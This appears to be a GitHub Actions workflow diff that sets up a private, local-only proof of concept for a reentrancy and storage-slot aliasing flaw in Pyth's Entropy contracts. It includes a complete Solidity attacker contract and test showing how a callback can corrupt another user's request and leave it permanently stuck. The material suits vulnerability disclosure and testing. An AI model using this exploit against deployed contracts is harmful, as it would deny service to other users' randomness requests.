@@ -1,0 +1,327 @@
+name: Private Pyth Entropy slot-alias PoC
+
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/pyth-entropy-slot-alias-poc-20260730.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 45
+    steps:
+      - name: Checkout current public Pyth source
+        uses: actions/checkout@v4
+        with:
+          repository: pyth-network/pyth-crosschain
+          ref: 56edfe66a3369a1e367c13cae627011a0abda839
+          path: pyth-crosschain
+          persist-credentials: false
+          fetch-depth: 1
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version-file: 'pyth-crosschain/package.json'
+
+      - name: Install libusb build dependencies
+        shell: bash
+        run: sudo apt-get update && sudo apt-get install -y libusb-1.0-0-dev libudev-dev
+
+      - uses: pnpm/action-setup@v4
+        with:
+          package_json_file: pyth-crosschain/package.json
+          run_install: true
+
+      - name: Install Foundry
+        uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: v0.3.0
+
+      - name: Add deterministic local-only PoC
+        shell: bash
+        working-directory: pyth-crosschain/target_chains/ethereum/contracts
+        run: |
+          set -euo pipefail
+          cat > test/EntropySlotAliasPoC.t.sol <<'SOL'
+          // SPDX-License-Identifier: Apache-2.0
+          pragma solidity ^0.8.0;
+
+          import "forge-std/Test.sol";
+          import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+          import "@pythnetwork/entropy-sdk-solidity/IEntropy.sol";
+          import "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";
+          import "@pythnetwork/entropy-sdk-solidity/EntropyErrors.sol";
+          import "@pythnetwork/entropy-sdk-solidity/EntropyStatusConstants.sol";
+          import "@pythnetwork/entropy-sdk-solidity/EntropyStructsV2.sol";
+          import "../contracts/entropy/EntropyUpgradable.sol";
+          import "./utils/EntropyTestUtils.t.sol";
+
+          contract NonCallbackVictim {
+              IEntropy public immutable entropy;
+              address public immutable provider;
+              uint64 public sequence;
+              bytes32 public secret;
+
+              constructor(IEntropy entropy_, address provider_) {
+                  entropy = entropy_;
+                  provider = provider_;
+              }
+
+              // Models a permissionless consumer endpoint that creates a legacy,
+              // non-callback request. The caller funds the request, while Entropy
+              // correctly records this contract as the requester.
+              function createRequest(bytes32 secret_) external payable returns (uint64) {
+                  secret = secret_;
+                  sequence = entropy.request{value: msg.value}(
+                      provider,
+                      entropy.constructUserCommitment(secret_),
+                      false
+                  );
+                  return sequence;
+              }
+
+              function revealNormally(bytes32 providerContribution) external returns (bytes32) {
+                  return entropy.reveal(provider, sequence, secret, providerContribution);
+              }
+          }
+
+          contract ReentrantAliasRequester is IEntropyConsumer {
+              IEntropy public immutable entropy;
+              address public immutable provider;
+              NonCallbackVictim public immutable victim;
+              uint128 public immutable fee;
+              bytes32 public immutable victimSecret;
+
+              uint64 public oldSequence;
+              uint64 public victimSequence;
+              bool public callbackRan;
+
+              constructor(
+                  IEntropy entropy_,
+                  address provider_,
+                  NonCallbackVictim victim_,
+                  uint128 fee_,
+                  bytes32 victimSecret_
+              ) {
+                  entropy = entropy_;
+                  provider = provider_;
+                  victim = victim_;
+                  fee = fee_;
+                  victimSecret = victimSecret_;
+              }
+
+              function begin(bytes32 userContribution, uint32 gasLimit) external returns (uint64) {
+                  oldSequence = entropy.requestV2{value: fee}(
+                      provider,
+                      userContribution,
+                      gasLimit
+                  );
+                  return oldSequence;
+              }
+
+              function getEntropy() internal view override returns (address) {
+                  return address(entropy);
+              }
+
+              function shortSlot(address provider_, uint64 sequence_) public pure returns (uint8) {
+                  bytes32 key = keccak256(abi.encodePacked(provider_, sequence_));
+                  return uint8(key[0]) & 0x1f;
+              }
+
+              function entropyCallback(
+                  uint64 sequence,
+                  address callbackProvider,
+                  bytes32
+              ) internal override {
+                  require(!callbackRan, "callback replay");
+                  require(sequence == oldSequence, "wrong sequence");
+                  require(callbackProvider == provider, "wrong provider");
+                  callbackRan = true;
+
+                  uint8 target = shortSlot(provider, oldSequence);
+                  for (uint256 i = 0; i < 64; i++) {
+                      uint64 next = entropy.getProviderInfoV2(provider).sequenceNumber;
+                      if (shortSlot(provider, next) == target) {
+                          victimSequence = victim.createRequest{value: fee}(victimSecret);
+                          require(victimSequence == next, "sequence changed");
+                          return;
+                      }
+
+                      // Advance to the first sequence whose five-bit short-key
+                      // collides with the in-flight callback request. These filler
+                      // requests remain valid and are not used as evidence.
+                      bytes32 fillerSecret = keccak256(abi.encodePacked("filler", next));
+                      entropy.request{value: fee}(
+                          provider,
+                          entropy.constructUserCommitment(fillerSecret),
+                          false
+                      );
+                  }
+                  revert("no collision within bound");
+              }
+
+              receive() external payable {}
+          }
+
+          contract EntropySlotAliasPoC is Test, EntropyTestUtils {
+              EntropyUpgradable internal entropy;
+              address internal constant PROVIDER = address(0xBEEF);
+              address internal constant OWNER = address(0xA11CE);
+              address internal constant ADMIN = address(0xAD01);
+              bytes32[] internal proofs;
+
+              function setUp() public {
+                  EntropyUpgradable implementation = new EntropyUpgradable();
+                  bytes memory init = abi.encodeCall(
+                      EntropyUpgradable.initialize,
+                      (OWNER, ADMIN, uint128(1), PROVIDER, false)
+                  );
+                  ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), init);
+                  entropy = EntropyUpgradable(address(proxy));
+
+                  proofs = generateHashChain(PROVIDER, 0, 1000);
+                  vm.prank(PROVIDER);
+                  entropy.register(0, proofs[0], hex"0100", 1000, bytes("local"));
+                  vm.prank(PROVIDER);
+                  entropy.setMaxNumHashes(500);
+              }
+
+              function test_storageReferenceAliasesNewVictimRequest() public {
+                  bytes32 oldUserContribution = keccak256("old-user-contribution");
+                  bytes32 victimSecret = keccak256("victim-secret");
+                  uint32 callbackGasLimit = 20_000_000;
+                  uint128 fee = entropy.getFeeV2(PROVIDER, callbackGasLimit);
+                  assertEq(fee, 1);
+
+                  NonCallbackVictim victim = new NonCallbackVictim(
+                      IEntropy(address(entropy)),
+                      PROVIDER
+                  );
+                  ReentrantAliasRequester attacker = new ReentrantAliasRequester(
+                      IEntropy(address(entropy)),
+                      PROVIDER,
+                      victim,
+                      fee,
+                      victimSecret
+                  );
+                  vm.deal(address(attacker), uint256(fee) * 100);
+
+                  uint64 oldSequence = attacker.begin(
+                      oldUserContribution,
+                      callbackGasLimit
+                  );
+                  uint8 oldSlot = attacker.shortSlot(PROVIDER, oldSequence);
+
+                  EntropyStructsV2.Request memory oldBefore = entropy.getRequestV2(
+                      PROVIDER,
+                      oldSequence
+                  );
+                  assertEq(
+                      oldBefore.callbackStatus,
+                      EntropyStatusConstants.CALLBACK_NOT_STARTED
+                  );
+
+                  entropy.revealWithCallback(
+                      PROVIDER,
+                      oldSequence,
+                      oldUserContribution,
+                      proofs[oldSequence]
+                  );
+
+                  assertTrue(attacker.callbackRan());
+                  uint64 victimSequence = attacker.victimSequence();
+                  assertGt(victimSequence, oldSequence);
+                  assertEq(
+                      attacker.shortSlot(PROVIDER, victimSequence),
+                      oldSlot,
+                      "PoC did not reach the aliased short-request slot"
+                  );
+
+                  // The original request was moved to overflow during callback
+                  // and then cleared by the outer reveal.
+                  assertEq(
+                      entropy.getRequestV2(PROVIDER, oldSequence).sequenceNumber,
+                      0
+                  );
+
+                  EntropyStructsV2.Request memory corrupted = entropy.getRequestV2(
+                      PROVIDER,
+                      victimSequence
+                  );
+                  assertEq(corrupted.sequenceNumber, victimSequence);
+                  assertEq(corrupted.requester, address(victim));
+                  assertEq(corrupted.gasLimit10k, 0);
+
+                  // This request was created through request(), so its correct
+                  // status was CALLBACK_NOT_NECESSARY. The outer call's stale
+                  // storage reference overwrote it with CALLBACK_NOT_STARTED.
+                  assertEq(
+                      corrupted.callbackStatus,
+                      EntropyStatusConstants.CALLBACK_NOT_STARTED,
+                      "victim request was not corrupted"
+                  );
+                  assertTrue(
+                      corrupted.callbackStatus !=
+                          EntropyStatusConstants.CALLBACK_NOT_NECESSARY
+                  );
+
+                  // The intended non-callback reveal path is now permanently denied.
+                  vm.expectRevert(EntropyErrors.InvalidRevealCall.selector);
+                  victim.revealNormally(proofs[victimSequence]);
+
+                  // The callback path also cannot recover a contract which never
+                  // implemented IEntropyConsumer. It reverts and restores the
+                  // corrupted request, leaving it active but unusable.
+                  vm.expectRevert();
+                  entropy.revealWithCallback(
+                      PROVIDER,
+                      victimSequence,
+                      victimSecret,
+                      proofs[victimSequence]
+                  );
+
+                  EntropyStructsV2.Request memory stillStuck = entropy.getRequestV2(
+                      PROVIDER,
+                      victimSequence
+                  );
+                  assertEq(stillStuck.sequenceNumber, victimSequence);
+                  assertEq(
+                      stillStuck.callbackStatus,
+                      EntropyStatusConstants.CALLBACK_NOT_STARTED
+                  );
+              }
+          }
+          SOL
+
+      - name: Install Forge dependencies
+        shell: bash
+        working-directory: pyth-crosschain/target_chains/ethereum/contracts
+        run: pnpm run install-forge-deps
+
+      - name: Run exact PoC and upstream Entropy regression tests
+        shell: bash
+        working-directory: pyth-crosschain/target_chains/ethereum/contracts
+        run: |
+          set -o pipefail
+          mkdir -p "$GITHUB_WORKSPACE/evidence"
+          forge test --match-contract EntropySlotAliasPoC -vvv \
+            | tee "$GITHUB_WORKSPACE/evidence/slot-alias-poc.log"
+          forge test --match-contract EntropyTest --deny-warnings \
+            | tee "$GITHUB_WORKSPACE/evidence/upstream-entropy-regression.log"
+          cp test/EntropySlotAliasPoC.t.sol "$GITHUB_WORKSPACE/evidence/"
+          sha256sum "$GITHUB_WORKSPACE/evidence/"* \
+            > "$GITHUB_WORKSPACE/evidence/SHA256SUMS.txt"
+
+      - name: Upload exact local PoC evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: pyth-entropy-slot-alias-poc-${{ github.run_id }}
+          path: evidence/
+          if-no-files-found: error
+          retention-days: 1
+          compression-level: 6
